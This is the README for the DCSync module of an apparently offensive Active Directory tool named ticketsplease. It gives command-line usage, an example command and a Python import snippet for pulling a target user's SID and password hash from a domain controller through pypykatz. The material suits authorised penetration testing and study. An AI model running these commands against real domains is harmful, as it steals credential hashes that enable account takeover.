# dcsync Module

This module will perform a DCSync operation to retrieve the SID and password hash of a given user. This wraps the `pypykatz` library DCSync handling.

## Usage

This module can be used via the command line or it can be imported as a module into your Python code base.

```
usage: ticketsplease dcsync [-h] --dc-ip DC_IP --domain DOMAIN --target-user TARGET_USER 
                            --username USERNAME [--password PASSWORD] [--password-hash PASSWORD_HASH]
                            [--debug]

Retrieve SID and password hash via DCSync for a target user

optional arguments:
  -h, --help            show this help message and exit

  --dc-ip DC_IP         IP address of the target Domain Controller.

  --domain DOMAIN       Target domain the Domain Controller is in (i.e. company.com).

  --target-user TARGET_USER
                        Target user to retrieve the SID and password hash for.

  --username USERNAME   Username to perform DCSync operations with.

  --password PASSWORD   Password of the account to perform DCSync operations with.

  --password-hash PASSWORD_HASH
                        Password hash of the account to perform DCSync operations with
                        (supersedes --dcsync-password).

  --debug               Enable debugging.

example usage:

    ticketsplease dcsync --domain company.com --target-user user --username admin \
                         --password password --dc-ip 10.10.10.10
```

## Importing the Module

```python
import asyncio
from ticketsplease.modules.dcsync import DCSYNC

(user_sid, user_hash) = asyncio.run(
    DCSYNC.run(
        dc_ip,
        domain,
        target_user,
        username,
        password,
        hash,
    )
)
```